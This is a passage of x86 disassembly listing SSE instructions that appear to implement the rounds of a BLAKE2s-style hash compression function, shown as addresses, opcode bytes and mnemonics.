  405028:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  40502d:	66 0f ef cb          	pxor   %xmm3,%xmm1
  405031:	66 0f 6e 74 24 14    	movd   0x14(%esp),%xmm6
  405037:	0f 28 c1             	movaps %xmm1,%xmm0
  40503a:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  40503f:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  405044:	66 0f ef c1          	pxor   %xmm1,%xmm0
  405048:	66 0f 6e 4c 24 1c    	movd   0x1c(%esp),%xmm1
  40504e:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  405053:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  405057:	66 0f 6e 54 24 0c    	movd   0xc(%esp),%xmm2
  40505d:	66 0f 6e c1          	movd   %ecx,%xmm0
  405061:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  405065:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  405069:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  40506f:	66 0f fe fb          	paddd  %xmm3,%xmm7
  405073:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  405078:	66 0f ef c7          	pxor   %xmm7,%xmm0
  40507c:	66 0f 6e 4c 24 28    	movd   0x28(%esp),%xmm1
  405082:	0f 28 e0             	movaps %xmm0,%xmm4
  405085:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  405089:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  40508e:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  405093:	66 0f 6e 54 24 28    	movd   0x28(%esp),%xmm2
  405099:	66 0f ef e0          	pxor   %xmm0,%xmm4
  40509d:	66 0f fe ec          	paddd  %xmm4,%xmm5
  4050a1:	0f 28 c5             	movaps %xmm5,%xmm0
  4050a4:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4050a8:	0f 28 d8             	movaps %xmm0,%xmm3
  4050ab:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  4050b0:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  4050b5:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4050b9:	66 0f 6e 44 24 24    	movd   0x24(%esp),%xmm0
  4050bf:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  4050c3:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  4050c7:	66 0f fe f7          	paddd  %xmm7,%xmm6
  4050cb:	66 0f 6e fe          	movd   %esi,%xmm7
  4050cf:	66 0f fe f3          	paddd  %xmm3,%xmm6
  4050d3:	0f 28 c6             	movaps %xmm6,%xmm0
  4050d6:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4050da:	0f 28 e0             	movaps %xmm0,%xmm4
  4050dd:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  4050e2:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  4050e7:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  4050ec:	66 0f ef e0          	pxor   %xmm0,%xmm4
  4050f0:	0f 28 f4             	movaps %xmm4,%xmm6
  4050f3:	66 0f fe f5          	paddd  %xmm5,%xmm6
  4050f7:	0f 28 ce             	movaps %xmm6,%xmm1
  4050fa:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  4050ff:	66 0f ef cb          	pxor   %xmm3,%xmm1
  405103:	0f 28 c1             	movaps %xmm1,%xmm0
  405106:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  40510b:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  405110:	66 0f ef c1          	pxor   %xmm1,%xmm0
  405114:	66 0f 6e 4c 24 14    	movd   0x14(%esp),%xmm1
  40511a:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  40511f:	66 0f 6e 44 24 30    	movd   0x30(%esp),%xmm0
  405125:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  405129:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  40512d:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  405131:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  405137:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  40513c:	66 0f fe fb          	paddd  %xmm3,%xmm7
  405140:	66 0f ef c7          	pxor   %xmm7,%xmm0
  405144:	0f 28 e0             	movaps %xmm0,%xmm4
  405147:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  40514c:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  405151:	66 0f ef e0          	pxor   %xmm0,%xmm4
  405155:	66 0f fe ec          	paddd  %xmm4,%xmm5
  405159:	66 0f 6e 4c 24 34    	movd   0x34(%esp),%xmm1
  40515f:	0f 28 c5             	movaps %xmm5,%xmm0
  405162:	66 0f ef c3          	pxor   %xmm3,%xmm0
  405166:	66 0f 6e 74 24 0c    	movd   0xc(%esp),%xmm6
  40516c:	0f 28 d8             	movaps %xmm0,%xmm3
  40516f:	66 0f 6e d1          	movd   %ecx,%xmm2
  405173:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  405178:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  40517c:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  405181:	66 0f 6e 54 24 24    	movd   0x24(%esp),%xmm2
  405187:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40518b:	66 0f 6e 44 24 10    	movd   0x10(%esp),%xmm0
  405191:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  405195:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  405199:	66 0f fe f7          	paddd  %xmm7,%xmm6
  40519d:	66 0f 6e 7c 24 18    	movd   0x18(%esp),%xmm7
  4051a3:	66 0f fe f3          	paddd  %xmm3,%xmm6
  4051a7:	0f 28 c6             	movaps %xmm6,%xmm0
  4051aa:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4051ae:	0f 28 e0             	movaps %xmm0,%xmm4
  4051b1:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  4051b6:	0f 11 74 24 40       	movups %xmm6,0x40(%esp)
  4051bb:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  4051c0:	66 0f ef e0          	pxor   %xmm0,%xmm4
  4051c4:	0f 28 f4             	movaps %xmm4,%xmm6
  4051c7:	66 0f fe f5          	paddd  %xmm5,%xmm6
  4051cb:	0f 28 ce             	movaps %xmm6,%xmm1
  4051ce:	66 0f 70 ee 4e       	pshufd $0x4e,%xmm6,%xmm5
  4051d3:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4051d7:	66 0f 6e 74 24 2c    	movd   0x2c(%esp),%xmm6
  4051dd:	0f 28 c1             	movaps %xmm1,%xmm0
  4051e0:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  4051e5:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  4051ea:	66 0f ef c1          	pxor   %xmm1,%xmm0
  4051ee:	66 0f 6e cf          	movd   %edi,%xmm1
